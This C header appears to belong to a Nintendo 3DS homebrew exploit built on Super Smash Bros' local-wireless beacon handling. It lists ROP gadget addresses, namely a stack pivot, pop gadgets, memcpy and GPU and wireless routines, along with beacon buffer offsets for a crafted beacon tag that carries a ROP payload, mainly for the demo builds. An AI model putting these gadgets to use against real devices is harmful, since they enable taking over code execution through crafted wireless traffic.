#ifndef SMASHBROSHAX_H_
#define SMASHBROSHAX_H_

#if APPBUILD==0
//USA/EUR demos(unknown if these are valid for the JPN demos):

#define ADDITIONALDATA_ADR 0x00c9d7d0
#define STACKPIVOT_ADR 0x0012a4f4 //This stack-pivot gadget also exists in spider.
#define POP_PC 0x0010b930
#define POP_R0R4SLIPPC 0x001ca5b4 //pop {r0, r1, r2, r3, r4, sl, ip, pc}

#define MEMCPY 0x0016e350

#define SVCSLEEPTHREAD 0x001acba4

#define NWMUDS_RecvBeaconBroadcastData 0x00314860 //r0=outbuf, r1=size, r2=u8id, r3=wlancommID

#define LOCALWLAN_SHUTDOWN 0x003158bc //Calls nwmuds_shutdown code and some ndmu code.

#define GSPGPU_SERVHANDLEADR 0x00c119b8
#define GSPGPU_FLUSHDCACHE 0x0015cea4

#define GXLOW_CMD4 0x00171cc8

#elif APPBUILD==10//Full-game v1.0.

#if REGION==3//JPN
#define STACKPIVOT_ADR 0x0012e264

#error "This appbuild+region isn't fully supported."
#else
#error "The specified region for this APPBUILD value is not supported."
#endif

#else
#error "The specified APPBUILD value is not supported."
#endif

#define POP_LRPC STACKPIVOT_ADR+0x18
#define MOVSPLR_POPLRPC STACKPIVOT_ADR+0x14 //"mov sp, lr" "pop {lr, pc}"

#define TMPBUF_ADR 0x33F50000

#define TEXT_FCRAMOFFSET 0x04500000

#define BEACONDATA_ADR TMPBUF_ADR+0x1000 //ADDITIONALDATA_ADR+0xb8
#define BEACONTAGDATA_OUITYPE80_OFFSET (0xc + 0x1c + 0x1bc)
#define BEACONTAGDATA_OUITYPE80_ADR (BEACONDATA_ADR + BEACONTAGDATA_OUITYPE80_OFFSET) //Offset 0x0 in the tag-data in the tag for OUI type 0x80(from smashbros_beacon_rop_payload.s).

#endif

